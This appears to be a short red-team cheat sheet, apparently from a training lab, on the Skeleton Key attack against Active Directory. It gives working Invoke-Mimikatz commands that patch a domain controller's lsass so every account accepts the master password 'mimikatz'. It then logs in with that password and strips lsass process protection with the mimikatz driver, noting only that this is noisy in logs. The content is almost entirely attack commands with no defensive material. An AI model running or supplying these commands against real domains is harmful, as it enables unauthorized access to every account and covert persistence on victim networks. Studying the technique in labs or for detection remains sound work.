- Persistence technique to patch a domain controller (lsass process) that it allows access as any user with a single password
- Not persistent accross reboots

# Inject a skeleton key
Run with domain admin privileges
```powershell
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

# Access any machine with a valid uername and password as "mimikatz"
```powershell
Enter-PSSession –Computername dcorp-dc –credential dcorp\Administrator
```

# In case lsass is running as a protected process
It needs mimikatz driver (mimidriv.sys) on disk of the target DC:
But note that this would be very noisy in logs - Service installation (Kernel mode driver)

```powershell
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```
